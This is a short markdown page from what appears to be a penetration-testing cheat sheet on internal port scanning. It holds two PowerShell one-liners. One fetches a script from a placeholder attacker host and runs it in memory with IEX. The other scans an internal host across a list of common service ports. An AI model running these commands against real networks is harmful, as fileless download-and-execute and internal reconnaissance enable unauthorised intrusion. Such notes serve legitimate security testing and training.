---
title: Internal Scanning - Portscan
sidebar_position: 2
---


### Download script directly in memory
 ```powershell
IEX(New-Object Net.webclient).downloadString('http://[ATTACKER_IP]/Invoke-Portscan.ps1')
 ```
### Scan Single Internal Target
```powershell
Invoke-Portscan -Hosts [INTERNAL_IP] -Ports "21,22,23,53,69,71,80,88,98,110,139,111,389,443,445,1080,1433,2001,2049,3001,3128,5222,5985,5986,6667,6868,7777,7878,8000,8080,1521,3306,3389,5801,5900,5555,5901" | Select -ExpandProperty openPorts
 ```
